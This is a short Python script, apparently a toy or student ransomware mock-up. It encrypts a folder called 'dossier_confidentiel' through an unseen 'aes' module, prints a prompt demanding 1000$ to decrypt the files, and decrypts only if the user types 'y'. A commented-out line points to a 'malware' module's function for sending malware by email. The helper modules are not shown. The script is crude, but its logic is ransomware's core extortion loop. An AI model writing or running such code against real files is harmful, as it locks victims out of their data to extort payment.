import aes
import malware

def main():
    folder = aes.read_folder("./dossier_confidentiel")
    aes.encrypt_folder(folder, aes.key)
    # malware.send_malware_email()
    pay = input("Pay me 1000$ to decrypt your files: y or n\n->  ")
    if pay == "y":
        aes.decrypt_folder(folder, aes.key)
    print("Hello, World!")

    
if __name__ == "__main__":
    main()